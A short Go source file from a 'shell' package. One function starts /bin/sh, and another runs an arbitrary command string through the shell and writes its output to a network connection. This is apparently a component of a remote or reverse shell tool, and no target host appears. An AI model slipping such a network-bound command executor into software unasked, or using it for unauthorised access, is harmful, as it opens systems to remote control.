//+build linux darwin !windows

package shell

import (
	"net"
	"os/exec"
)

//GetShell return a *exec.Cmd instance which will run /bin/sh
func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

// ExecuteCmd runs the provided command through /bin/sh & redirects the result net.Conn object
func ExecuteCmd(command string, conn net.Conn) {
	cmdPath := "/bin/sh"
	cmd := exec.Command(cmdPath, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
